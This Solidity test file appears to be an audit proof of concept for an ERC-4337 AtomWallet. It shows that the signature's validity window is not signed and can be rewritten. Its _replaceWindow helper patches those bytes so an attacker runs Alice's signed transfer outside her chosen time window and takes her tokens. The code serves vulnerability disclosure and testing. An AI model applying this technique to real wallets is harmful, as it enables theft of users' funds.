// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import { BaseTest } from "./BaseTest.t.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { EntryPoint } from "@account-abstraction/core/EntryPoint.sol";
import { IEntryPoint } from "@account-abstraction/interfaces/IEntryPoint.sol";
import { PackedUserOperation } from "@account-abstraction/interfaces/PackedUserOperation.sol";

import { AtomWallet } from "src/protocol/wallet/AtomWallet.sol";

contract PoCCore is BaseTest {
    EntryPoint internal entryPoint;
    AtomWallet internal atomWallet;
    bytes32 internal atomId;

    uint256 internal alicePrivateKey;
    uint256 internal constant TRUST_TRANSFER_AMOUNT = 100 ether;
    uint256 internal constant ENTRYPOINT_DEPOSIT_AMOUNT = 1 ether;

    function setUp() public override {
        super.setUp();
        vm.stopPrank();

        // We need a private key to produce a valid ECDSA signature that recovers to `users.alice`.
        // BaseTest creates users via `makeAddr`, which doesn't provide a private key.
        (address aliceAddr, uint256 pk) = makeAddrAndKey("alice-signer");
        users.alice = payable(aliceAddr);
        alicePrivateKey = pk;
        vm.deal(users.alice, 10_000 ether);

        // Deploy a real EIP-4337 EntryPoint.
        entryPoint = new EntryPoint();

        // Ensure AtomWalletFactory uses our deployed entrypoint when initializing wallets.
        vm.mockCall(
            address(protocol.multiVault),
            abi.encodeWithSelector(protocol.multiVault.walletConfig.selector),
            abi.encode(address(entryPoint), address(ATOM_WARDEN), address(protocol.atomWalletBeacon), address(protocol.atomWalletFactory))
        );

        // Create a real atom in the protocol, then deploy its wallet through the factory.
        bytes memory atomData = bytes("PoC atom");
        atomId = calculateAtomId(atomData);

        uint256 atomCost = protocol.multiVault.getAtomCost();
        bytes[] memory atomDataArray = new bytes[](1);
        atomDataArray[0] = atomData;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = atomCost;

        vm.prank(users.alice);
        protocol.multiVault.createAtoms{ value: atomCost }(atomDataArray, amounts);

        atomWallet = AtomWallet(payable(protocol.atomWalletFactory.deployAtomWallet(atomId)));

        // Claim the wallet to Alice so signature validation checks against `users.alice`.
        vm.prank(ATOM_WARDEN);
        atomWallet.transferOwnership(users.alice);
        vm.prank(users.alice);
        atomWallet.acceptOwnership();

        // Fund the wallet with TRUST so the `execute()` call can transfer out.
        vm.prank(users.controller); // Trust.baseEmissionsController
        protocol.trust.mint(address(atomWallet), TRUST_TRANSFER_AMOUNT);

        // Fund deposit in EntryPoint so handleOps can charge gas.
        vm.prank(users.alice);
        atomWallet.addDeposit{ value: ENTRYPOINT_DEPOSIT_AMOUNT }();
    }

    function test_executeBeforeIntendedTimeframe() external {
        uint256 startTs = 1_000_000;
        vm.warp(startTs);

        // Alice intends this op to be valid only starting 1 day from now.
        uint48 aliceValidAfter = uint48(startTs + ONE_DAY);
        uint48 aliceValidUntil = uint48(startTs + 2 * ONE_DAY);

        PackedUserOperation memory userOp = _createTrustTransferUserOp();
        bytes32 userOpHash = IEntryPoint(address(entryPoint)).getUserOpHash(userOp);
        bytes memory rawSig = _signUserOpHash(alicePrivateKey, userOpHash);

        userOp.signature = abi.encodePacked(rawSig, aliceValidUntil, aliceValidAfter);

        // What Alice would hand to a bundler / scheduler (or what might appear in an op-mempool).
        bytes memory aliceSignedUserOpSignature = userOp.signature;

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        // Before aliceValidAfter, the op should NOT execute.
        uint256 bobTrustBefore = protocol.trust.balanceOf(users.bob);
        vm.expectRevert();
        entryPoint.handleOps(ops, payable(users.bob));
        assertEq(protocol.trust.balanceOf(users.bob), bobTrustBefore);

        // Bob (or any bundler) can take the *same* raw signature and replace only the suffix.
        // Since validAfter/validUntil are extracted from the signature bytes and not included
        // in what is signed (they're inside `userOp.signature`, which is excluded from userOpHash),
        // the wallet will treat the modified time window as authentic.
        uint48 bobValidAfter = 0;
        // Bob doesn't (and can't) re-sign as Alice. He just mutates the suffix bytes.
        userOp.signature = _replaceWindow(aliceSignedUserOpSignature, aliceValidUntil, bobValidAfter);
        ops[0] = userOp;

        vm.prank(users.bob);
        entryPoint.handleOps(ops, payable(users.bob));

        assertEq(protocol.trust.balanceOf(users.bob), bobTrustBefore + TRUST_TRANSFER_AMOUNT);
        assertEq(protocol.trust.balanceOf(address(atomWallet)), 0);
    }

    function test_executeAfterIntendedTimeframe() external {
        uint256 startTs = 2_000_000;
        vm.warp(startTs);

        // Alice intends this op to be valid only in a narrow window [start+1h, start+2h].
        uint48 aliceValidAfter = uint48(startTs + ONE_HOUR);
        uint48 aliceValidUntil = uint48(startTs + 2 * ONE_HOUR);

        PackedUserOperation memory userOp = _createTrustTransferUserOp();
        bytes32 userOpHash = IEntryPoint(address(entryPoint)).getUserOpHash(userOp);
        bytes memory rawSig = _signUserOpHash(alicePrivateKey, userOpHash);

        userOp.signature = abi.encodePacked(rawSig, aliceValidUntil, aliceValidAfter);
        bytes memory aliceSignedUserOpSignature = userOp.signature;

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        // If the window is missed, this should not execute.
        vm.warp(startTs + 3 * ONE_HOUR);
        uint256 bobTrustBefore = protocol.trust.balanceOf(users.bob);
        vm.expectRevert();
        entryPoint.handleOps(ops, payable(users.bob));
        assertEq(protocol.trust.balanceOf(users.bob), bobTrustBefore);

        // Attacker can still force execution by extending validUntil and setting validAfter=0,
        // by mutating the (unsigned) suffix bytes.
        uint48 attackerValidAfter = 0;
        uint48 attackerValidUntil = uint48(block.timestamp + ONE_DAY);
        userOp.signature = _replaceWindow(aliceSignedUserOpSignature, attackerValidUntil, attackerValidAfter);
        ops[0] = userOp;

        vm.prank(users.bob);
        entryPoint.handleOps(ops, payable(users.bob));

        assertEq(protocol.trust.balanceOf(users.bob), bobTrustBefore + TRUST_TRANSFER_AMOUNT);
    }

    //--------------------------------------------------------------------------------------------
    // SET UP HELPER FUNCTIONS
    //--------------------------------------------------------------------------------------------
    function _createTrustTransferUserOp() internal view returns (PackedUserOperation memory userOp) {
        bytes memory transferCall = abi.encodeCall(IERC20.transfer, (users.bob, TRUST_TRANSFER_AMOUNT));
        bytes memory execCall = abi.encodeCall(AtomWallet.execute, (address(protocol.trust), 0, transferCall));

        userOp = PackedUserOperation({
            sender: address(atomWallet),
            nonce: IEntryPoint(address(entryPoint)).getNonce(address(atomWallet), 0),
            initCode: "",
            callData: execCall,
            // (verificationGasLimit << 128) | callGasLimit
            accountGasLimits: bytes32(uint256(400_000) << 128 | uint256(400_000)),
            preVerificationGas: 80_000,
            // (maxPriorityFeePerGas << 128) | maxFeePerGas
            gasFees: bytes32(uint256(1 gwei) << 128 | uint256(1 gwei)),
            paymasterAndData: "",
            signature: ""
        });
    }

    //--------------------------------------------------------------------------------------------
    // SIGNATURE SIGN FUNCTION
    //--------------------------------------------------------------------------------------------

    function _signUserOpHash(uint256 signerPrivateKey, bytes32 userOpHash) internal returns (bytes memory) {
        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, ethSignedMessageHash);
        return abi.encodePacked(r, s, v);
    }

    //--------------------------------------------------------------------------------------------
    // USEROP MANIPULATION FUNCTION
    //--------------------------------------------------------------------------------------------
    function _replaceWindow(bytes memory signatureWithWindow, uint48 newValidUntil, uint48 newValidAfter)
        internal
        pure
        returns (bytes memory patched)
    {
        // Layout: [65-byte rawSig][6-byte validUntil][6-byte validAfter]
        require(signatureWithWindow.length == 77, "PoC: signature must include window");

        patched = new bytes(signatureWithWindow.length);
        for (uint256 i = 0; i < signatureWithWindow.length; i++) {
            patched[i] = signatureWithWindow[i];
        }

        // Overwrite validUntil (bytes [65..70]) and validAfter (bytes [71..76]) as big-endian uint48.
        uint256 validUntilOffset = 65;
        uint256 validAfterOffset = 71;
        unchecked {
            for (uint256 i = 0; i < 6; i++) {
                patched[validUntilOffset + i] = bytes1(uint8(newValidUntil >> (8 * (5 - i))));
                patched[validAfterOffset + i] = bytes1(uint8(newValidAfter >> (8 * (5 - i))));
            }
        }
    }
}
